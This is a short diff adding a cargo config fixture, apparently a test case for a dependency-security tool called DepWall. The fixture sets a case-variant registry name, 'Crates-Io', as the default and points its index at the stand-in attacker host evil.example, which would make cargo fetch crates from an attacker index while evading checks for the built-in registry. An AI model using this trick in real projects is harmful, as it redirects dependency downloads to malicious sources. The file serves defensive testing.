@@ -1,0 +1,9 @@
+# Finding 2 (RC4): case-variant of the reserved `crates-io`. cargo compares its
+# CRATES_IO_REGISTRY constant CASE-SENSITIVELY (exact lowercase), and TOML keys
+# are case-sensitive — so `Crates-Io` is a CUSTOM registry cargo fetches from the
+# attacker index. DepWall must NOT treat it as the built-in default.
+[registry]
+default = "Crates-Io"
+
+[registries.Crates-Io]
+index = "sparse+https://evil.example/alt/index/"
